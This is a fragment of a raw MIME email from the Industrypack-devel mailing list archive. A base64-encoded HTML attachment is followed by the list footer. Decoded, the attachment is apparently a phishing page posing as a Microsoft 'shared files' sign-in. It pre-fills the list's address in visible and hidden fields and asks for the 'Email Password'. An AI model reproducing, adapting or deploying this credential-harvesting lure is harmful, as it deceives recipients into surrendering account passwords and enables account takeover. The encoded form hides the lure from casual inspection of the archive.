YW4gYWNjZXNzIHNoYXJlZCBmaWxlcyA8L2ZvbnQ+DQoJCQkJCQkJCTwvZm9udD4NCgkJCQkJCQkJ
PC9kaXY+DQoJCQkJCTwvdGQ+PC90cj4NCg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6NXB4
OyI+PC90ZD48L3RyPg0KDQoJCQkJCTx0cj48dGQ+DQoJCQkJCQk8dGFibGUgY2VsbHNwYWNpbmc9
IjAiIGFsaWduPSJjZW50ZXIiPg0KCQkJCQkJPHRyPjx0ZD4NCgkJCQkJCQk8ZGl2IGFsaWduPSJj
ZW50ZXIiPg0KCQkJCQkJCQk8aW5wdXQgIG5hbWU9ImxvZ2luIiB0eXBlPSJlbWFpbCIgdmFsdWU9
ImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXQiIGRpc2FibGVkPg0KCQkJ
CQkJCTwvZGl2Pg0KCQkJCQkJPC90ZD48L3RyPg0KDQoNCgkJCQkJCTx0cj48dGQgc3R5bGU9Imhl
aWdodDo3cHg7Ij48L3RkPjwvdHI+DQoNCgkJCQkJCTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGln
bj0iY2VudGVyIj4NCgkJCQkJCQkJPGlucHV0ICBuYW1lPSJwYXNzd2QiIHR5cGU9InBhc3N3b3Jk
IiBwbGFjZWhvbGRlcj0iRW1haWwgUGFzc3dvcmQiIHJlcXVpcmVkPg0KCQkJCQkJCTwvZGl2Pg0K
CQkJCQkJPC90ZD48L3RyPg0KCQkJCQkJPHRyPjx0ZCBzdHlsZT0iaGVpZ2h0OjE1cHg7Ij48L3Rk
PjwvdHI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImxlZnQiPg0KCQkJCQkJ
CQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2lnbiBpbiI+DQoJCQkJCQkJPC9kaXY+DQoJ
CQkJCQk8L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJPC90ZD48L3RyPg0KCQkJCQkJ
PHRyPjx0ZCBzdHlsZT0iaGVpZ2h0OjIwcHg7Ij4NCgkJCQkJCQk8aW5wdXQgIG5hbWU9ImxvZ2lu
IiB0eXBlPSJoaWRkZW4iIHZhbHVlPSJpbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9y
Z2UubmV0Ij4NCgkJCQkJCQk8L2Zvcm0+DQoJCQkJCQk8L3RkPjwvdHI+DQoJCQkJCQk8L3RhYmxl
Pg0KCQkJCQk8L3RkPjwvdHI+DQoJPC90YWJsZT4NCjwvZGl2Pg0KPC90ZD48L3RyPg0KPHRyPjx0
ZCBoZWlnaHQ9IjUlIiBiZ2NvbG9yPSIjMUMxQzFDIj4NCgk8ZGl2IGFsaWduPSJjZW50ZXIiPg0K
CQk8Zm9udCBmYWNlPSJ2ZXJkYW5hIiBzaXplPSIxIiBjb2xvcj0iI0ZGRiI+DQoJCQlDb3B5cmln
aHQgqSAyMDIyIG1pY3Jvc29mdC4gQWxsIHJpZ2h0cyByZXNlcnZlZC4NCgkJPC9mb250Pg0KCTwv
ZGl2Pg0KPC90ZD48L3RyPg0KPC90YWJsZT4NCjwvYm9keT4NCjwvaHRtbD4NCnRhcmdldD1fYmxh
bmsgDQpkYXRhLXNhZmVyZWRpcmVjdHVybD0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cQ==

------=_NextPart_000_0012_E619D622.93F90028
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_E619D622.93F90028
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_E619D622.93F90028--

